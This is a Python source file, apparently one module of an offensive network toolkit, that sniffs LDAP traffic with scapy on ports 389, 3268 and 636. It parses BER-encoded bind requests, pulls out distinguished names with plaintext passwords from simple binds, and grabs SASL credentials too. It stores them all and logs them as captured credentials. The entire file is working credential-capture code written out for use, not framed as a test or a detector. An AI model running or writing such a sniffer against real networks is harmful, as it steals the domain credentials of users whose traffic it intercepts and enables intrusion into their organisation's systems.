"""
LDAP Credential Capture Module
───────────────────────────────
Sniffs LDAP traffic for plaintext credentials:
  - Monitors port 389 for LDAP simple bind requests
  - Parses BER/ASN.1 encoded LDAP BindRequest messages (tag 0x60)
  - Extracts Distinguished Name (DN) and password
  - Logs plaintext domain credentials
  - Supports both simple authentication and SASL detection
"""

import re
import time
import struct
import threading
from collections import defaultdict

from scapy.all import IP, TCP, Raw, sniff

from .config import log


class LDAPCapture:
    """
    LDAP credential capture engine.

    Sniffs port 389 traffic for LDAP simple bind requests and extracts
    plaintext credentials (Distinguished Name + password).

    LDAP BindRequest structure (BER/ASN.1):
      APPLICATION[0] (tag 0x60) SEQUENCE {
        INTEGER version (usually 3),
        OCTET STRING name (DN),
        CHOICE authentication {
          [0] simple (OCTET STRING password),
          [3] sasl (SEQUENCE { mechanism, credentials })
        }
      }
    """

    # LDAP message/operation tags
    LDAP_BIND_REQUEST = 0x60    # APPLICATION[0] - BindRequest
    LDAP_BIND_RESPONSE = 0x61   # APPLICATION[1] - BindResponse
    LDAP_SEARCH_REQUEST = 0x63  # APPLICATION[3] - SearchRequest
    LDAP_MODIFY_REQUEST = 0x66  # APPLICATION[6] - ModifyRequest

    # Authentication choice tags (context-specific)
    AUTH_SIMPLE = 0x80          # [0] IMPLICIT OCTET STRING (simple auth)
    AUTH_SASL = 0xA3            # [3] CONSTRUCTED (SASL)

    def __init__(self, interface, ports=None):
        self.interface = interface
        self.ports = ports or [389, 3268, 636]  # LDAP, Global Catalog, LDAPS
        self._running = False
        self._thread = None
        self._credentials = []
        self._lock = threading.Lock()
        self._packets_processed = 0
        self._bind_attempts = 0

    def _parse_ber_length(self, data, offset):
        """Parse BER length field. Returns (length, new_offset)."""
        if offset >= len(data):
            return 0, offset

        first_byte = data[offset]
        offset += 1

        if first_byte < 0x80:
            # Short form
            return first_byte, offset
        elif first_byte == 0x80:
            # Indefinite form (rare in LDAP)
            return -1, offset
        else:
            # Long form
            num_bytes = first_byte & 0x7F
            if num_bytes > 4 or offset + num_bytes > len(data):
                return 0, offset
            length = 0
            for i in range(num_bytes):
                length = (length << 8) | data[offset + i]
            return length, offset + num_bytes

    def _parse_ber_integer(self, data, offset):
        """Parse BER INTEGER. Returns (value, new_offset)."""
        if offset >= len(data) or data[offset] != 0x02:
            return None, offset

        offset += 1  # Skip tag
        length, offset = self._parse_ber_length(data, offset)

        if length <= 0 or offset + length > len(data):
            return None, offset

        value = 0
        for i in range(length):
            value = (value << 8) | data[offset + i]
        return value, offset + length

    def _parse_ber_octet_string(self, data, offset):
        """Parse BER OCTET STRING. Returns (bytes_value, new_offset)."""
        if offset >= len(data) or data[offset] != 0x04:
            return None, offset

        offset += 1  # Skip tag
        length, offset = self._parse_ber_length(data, offset)

        if length < 0 or offset + length > len(data):
            return None, offset

        value = data[offset:offset + length]
        return value, offset + length

    def _parse_ldap_message(self, data):
        """
        Parse an LDAP message envelope.
        LDAP Message: SEQUENCE { messageID INTEGER, protocolOp CHOICE {...} }
        """
        offset = 0
        if offset >= len(data):
            return None

        # SEQUENCE tag (0x30)
        if data[offset] != 0x30:
            return None
        offset += 1

        # Sequence length
        seq_length, offset = self._parse_ber_length(data, offset)
        if seq_length <= 0:
            return None

        # Message ID (INTEGER)
        msg_id, offset = self._parse_ber_integer(data, offset)
        if msg_id is None:
            return None

        # Protocol operation - check tag
        if offset >= len(data):
            return None

        op_tag = data[offset]
        return {
            "message_id": msg_id,
            "op_tag": op_tag,
            "op_offset": offset
        }

    def _parse_bind_request(self, data, offset):
        """
        Parse LDAP BindRequest starting at the APPLICATION[0] tag.
        Returns dict with version, dn, auth_type, password/mechanism.
        """
        if offset >= len(data) or data[offset] != self.LDAP_BIND_REQUEST:
            return None

        offset += 1  # Skip APPLICATION tag

        # BindRequest length
        bind_length, offset = self._parse_ber_length(data, offset)
        if bind_length <= 0:
            return None

        bind_end = offset + bind_length

        # Version (INTEGER)
        version, offset = self._parse_ber_integer(data, offset)
        if version is None:
            return None

        # Name/DN (OCTET STRING)
        dn_bytes, offset = self._parse_ber_octet_string(data, offset)
        if dn_bytes is None:
            return None

        dn = dn_bytes.decode(errors='ignore')

        # Authentication choice
        if offset >= len(data):
            return None

        auth_tag = data[offset]
        result = {
            "version": version,
            "dn": dn,
            "auth_type": None,
            "password": None,
            "mechanism": None,
        }

        if auth_tag == self.AUTH_SIMPLE:
            # Simple authentication - [0] IMPLICIT OCTET STRING
            offset += 1
            password_len, offset = self._parse_ber_length(data, offset)
            if password_len >= 0 and offset + password_len <= len(data):
                password = data[offset:offset + password_len].decode(errors='ignore')
                result["auth_type"] = "simple"
                result["password"] = password
        elif auth_tag == self.AUTH_SASL:
            # SASL authentication - [3] CONSTRUCTED { mechanism, credentials }
            offset += 1
            sasl_len, offset = self._parse_ber_length(data, offset)
            # Try to extract mechanism name (OCTET STRING)
            if offset < len(data) and data[offset] == 0x04:
                mech_bytes, offset = self._parse_ber_octet_string(data, offset)
                if mech_bytes:
                    result["auth_type"] = "sasl"
                    result["mechanism"] = mech_bytes.decode(errors='ignore')
                    # Try to get SASL credentials
                    if offset < len(data) and data[offset] == 0x04:
                        cred_bytes, offset = self._parse_ber_octet_string(data, offset)
                        if cred_bytes:
                            result["password"] = cred_bytes.decode(errors='ignore')
        else:
            result["auth_type"] = f"unknown_0x{auth_tag:02x}"

        return result

    def _packet_handler(self, pkt):
        """Process packets for LDAP bind requests."""
        if not pkt.haslayer(TCP) or not pkt.haslayer(Raw):
            return

        tcp = pkt[TCP]
        # Check if traffic is on LDAP ports
        if tcp.dport not in self.ports and tcp.sport not in self.ports:
            return

        self._packets_processed += 1
        payload = bytes(pkt[Raw].load)
        src_ip = pkt[IP].src if pkt.haslayer(IP) else "unknown"
        dst_ip = pkt[IP].dst if pkt.haslayer(IP) else "unknown"

        if len(payload) < 10:
            return

        # Try to parse LDAP message
        msg = self._parse_ldap_message(payload)
        if msg is None:
            return

        # Check if it is a BindRequest
        if msg["op_tag"] != self.LDAP_BIND_REQUEST:
            return

        self._bind_attempts += 1

        # Parse the bind request
        bind = self._parse_bind_request(payload, msg["op_offset"])
        if bind is None:
            return

        # Log the bind attempt
        if bind["auth_type"] == "simple" and bind["password"]:
            credential = {
                "dn": bind["dn"],
                "password": bind["password"],
                "auth_type": "simple",
                "version": bind["version"],
                "src_ip": src_ip,
                "dst_ip": dst_ip,
                "dst_port": tcp.dport,
                "timestamp": time.time(),
            }

            with self._lock:
                self._credentials.append(credential)

            log.critical(
                f"LDAP CREDENTIAL CAPTURED: "
                f"DN={bind['dn']} Password={bind['password']} "
                f"from {src_ip} -> {dst_ip}:{tcp.dport}"
            )

        elif bind["auth_type"] == "sasl":
            credential = {
                "dn": bind["dn"],
                "password": bind.get("password", ""),
                "auth_type": f"sasl/{bind['mechanism']}",
                "mechanism": bind["mechanism"],
                "version": bind["version"],
                "src_ip": src_ip,
                "dst_ip": dst_ip,
                "dst_port": tcp.dport,
                "timestamp": time.time(),
            }

            with self._lock:
                self._credentials.append(credential)

            log.warning(
                f"LDAP SASL bind detected: "
                f"DN={bind['dn']} mechanism={bind['mechanism']} "
                f"from {src_ip}"
            )

        elif bind["dn"]:
            # Anonymous or empty password bind
            log.info(
                f"LDAP bind attempt (no password): DN={bind['dn']} "
                f"from {src_ip}"
            )

    def _sniff_loop(self):
        """Background sniffing thread."""
        port_filter = " or ".join(f"tcp port {p}" for p in self.ports)
        try:
            sniff(
                iface=self.interface,
                prn=self._packet_handler,
                store=False,
                filter=port_filter,
                stop_filter=lambda x: not self._running
            )
        except Exception as e:
            log.error(f"LDAP capture sniff error: {e}")

    def start(self):
        """Start LDAP credential capture."""
        if self._running:
            log.warning("LDAP capture already running")
            return False

        self._running = True
        self._thread = threading.Thread(target=self._sniff_loop, daemon=True)
        self._thread.start()
        log.info(f"LDAP capture started on {self.interface} (ports: {self.ports})")
        return True

    def stop(self):
        """Stop LDAP credential capture."""
        self._running = False
        if self._thread:
            self._thread.join(timeout=5)
        log.info(f"LDAP capture stopped. {len(self._credentials)} credentials captured")

    def get_credentials(self):
        """Return all captured LDAP credentials."""
        with self._lock:
            return list(self._credentials)

    def get_simple_binds(self):
        """Return only simple bind credentials (plaintext passwords)."""
        with self._lock:
            return [c for c in self._credentials if c["auth_type"] == "simple"]

    def get_stats(self):
        """Return LDAP capture statistics."""
        with self._lock:
            by_auth_type = defaultdict(int)
            by_server = defaultdict(int)
            for c in self._credentials:
                by_auth_type[c["auth_type"]] += 1
                by_server[c["dst_ip"]] += 1

            return {
                "running": self._running,
                "total_credentials": len(self._credentials),
                "simple_binds": sum(1 for c in self._credentials if c["auth_type"] == "simple"),
                "sasl_binds": sum(1 for c in self._credentials if "sasl" in c["auth_type"]),
                "bind_attempts": self._bind_attempts,
                "packets_processed": self._packets_processed,
                "by_auth_type": dict(by_auth_type),
                "by_server": dict(by_server),
            }
